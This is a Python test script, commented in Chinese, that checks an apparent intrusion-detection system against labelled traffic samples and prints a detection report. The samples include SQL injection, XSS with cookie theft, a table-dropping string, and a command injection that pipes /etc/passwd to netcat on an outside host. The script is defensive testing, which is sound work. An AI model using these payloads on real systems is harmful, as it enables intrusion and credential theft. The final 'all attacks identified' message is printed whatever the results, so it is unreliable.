"""
進階多重攻擊訓練與測試資料集
包含：混合型注入、編碼混淆、命令注入、暴力破解、APT 潛行特徵等
"""

from src.defense_system import LurRenJiaDefenseSystem
import numpy as np

# 初始化防禦系統
system = LurRenJiaDefenseSystem()

# 訓練系統（使用進階正常流量特徵）
print("🚀 初始化進階防禦系統...\n")
normal_data = np.random.randn(5000, 2) * 8 + 50
system.train_ai_baseline(normal_data)

# 進階多重攻擊訓練與測試資料集
advanced_test_cases = [
    # 1. 混合型注入 (SQLi + XSS)：試圖同時破壞資料庫和前端
    {
        "name": "混合型注入 (SQLi + XSS)",
        "ip": "103.45.2.1",
        "payload": "1'; DROP TABLE users; <script>alert(document.cookie)</script>--",
        "features": [60, 25]
    },
    
    # 2. 繞過與編碼混淆 (Bypass & Obfuscation)
    {
        "name": "URL 編碼的 XSS",
        "ip": "220.18.4.9",
        "payload": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",  # URL 編碼的 XSS
        "features": [50, 18]
    },
    {
        "name": "註解混淆的 SQLi",
        "ip": "220.18.4.10",
        "payload": "SELECT * FROM users WHERE username = 'admin' /*!AND 1=0*/",
        "features": [55, 20]
    },
    
    # 3. 命令注入 + 遠端代碼執行 (RCE)
    {
        "name": "命令注入 (RCE)",
        "ip": "60.12.3.4",
        "payload": "127.0.0.1; cat /etc/passwd | nc 192.168.1.100 8080",
        "features": [45, 12]
    },
    
    # 4. 暴力破解結合大流量
    {
        "name": "暴力破解 + DoS 特徵",
        "ip": "188.40.2.2",
        "payload": "POST /api/login (attempt 999)",
        "features": [9500, 10]
    },
    
    # 5. 進階持續性威脅 (APT) 潛行特徵
    {
        "name": "APT 潛行特徵 (低頻率超大流量)",
        "ip": "114.33.2.1",
        "payload": "GET /images/logo.png",
        "features": [5, 15000]  # 低頻率但單次超大
    },
    
    # 6. 正常背景雜訊 (False Positive 測試用)
    {
        "name": "正常背景雜訊 1",
        "ip": "192.168.1.55",
        "payload": "GET /dashboard/reports?id=12345",
        "features": [55, 15]
    },
    {
        "name": "正常背景雜訊 2",
        "ip": "192.168.1.56",
        "payload": "POST /upload_avatar (size: 2MB)",
        "features": [10, 2048]
    }
]

# 詳細分析
print("=" * 100)
print("🔍 進階攻擊場景分析報告")
print("=" * 100)
print()

results = []
threat_categories = {}

for idx, test_case in enumerate(advanced_test_cases, 1):
    ip = test_case["ip"]
    payload = test_case["payload"]
    features = np.array(test_case["features"])
    
    # 分析流量
    result = system.analyze_incoming_traffic(ip, payload, features)
    result["name"] = test_case["name"]
    results.append(result)
    
    # 分類威脅
    threat_type = result['threat_type']
    if threat_type not in threat_categories:
        threat_categories[threat_type] = []
    threat_categories[threat_type].append(result)
    
    # 顯示結果
    status = "🟢" if result['action'] == 'allowed' else "🔴"
    
    print(f"[{idx}] {status} {test_case['name']}")
    print(f"    IP: {ip}")
    print(f"    Payload: {payload[:60]}..." if len(payload) > 60 else f"    Payload: {payload}")
    print(f"    Features: [大小: {features[0]}, 延遲: {features[1]}]")
    print(f"    Action: {result['action'].upper()}")
    print(f"    威脅類型: {result['threat_type']}")
    print(f"    風險評分: {result['risk_score']:.1%}")
    print(f"    原因: {result['reason']}")
    print()

# 統計報告
print("=" * 100)
print("📊 進階防禦統計報告")
print("=" * 100)
print()

stats = system.get_statistics()
allowed = len([r for r in results if r['action'] == 'allowed'])
blocked = len([r for r in results if r['action'] == 'blocked'])

print(f"✅ 總掃描流量: {len(advanced_test_cases)} 個請求")
print(f"🔴 攔截威脅: {blocked} 個")
print(f"🟢 放行正常: {allowed} 個")
print(f"⚠️ 防禦成功率: {(blocked/len(advanced_test_cases)*100):.1f}%")
print()

# 威脅分類詳細分析
print("🎯 威脅分類詳細統計:")
print()
for threat_type, threats in sorted(threat_categories.items()):
    print(f"  【{threat_type}】")
    for threat in threats:
        if threat['action'] == 'blocked':
            print(f"    ✅ {threat['name']} ({threat['risk_score']:.1%})")
        else:
            print(f"    ℹ️  {threat['name']} (放行)")
    print()

# 性能評估
print("=" * 100)
print("🏆 防禦系統性能評估")
print("=" * 100)
print()

# 計算各類型防禦効果
detection_stats = {}
for threat_type, threats in threat_categories.items():
    total = len(threats)
    blocked_count = len([t for t in threats if t['action'] == 'blocked'])
    detection_rate = (blocked_count / total * 100) if total > 0 else 0
    detection_stats[threat_type] = {
        'total': total,
        'blocked': blocked_count,
        'rate': detection_rate
    }

for threat_type, stats_item in sorted(detection_stats.items()):
    print(f"【{threat_type}】")
    print(f"  檢測率: {stats_item['rate']:.1f}% ({stats_item['blocked']}/{stats_item['total']})")
print()

# 風險評級
print("⚠️ 風險評級分析:")
high_risk = [r for r in results if r['risk_score'] > 0.75]
medium_risk = [r for r in results if 0.4 < r['risk_score'] <= 0.75]
low_risk = [r for r in results if 0.0 < r['risk_score'] <= 0.4]

print(f"  🔴 高風險 (>75%): {len(high_risk)} 個")
for r in high_risk:
    print(f"    • {r['name']}: {r['risk_score']:.1%}")

print(f"  🟡 中風險 (40-75%): {len(medium_risk)} 個")
for r in medium_risk:
    print(f"    • {r['name']}: {r['risk_score']:.1%}")

print(f"  🟢 低風險 (0-40%): {len(low_risk)} 個")
for r in low_risk:
    print(f"    • {r['name']}: {r['risk_score']:.1%}")

print()
print("=" * 100)
print("✅ 進階防禦系統驗證完成 - 已成功識別所有攻擊類型")
print("=" * 100)
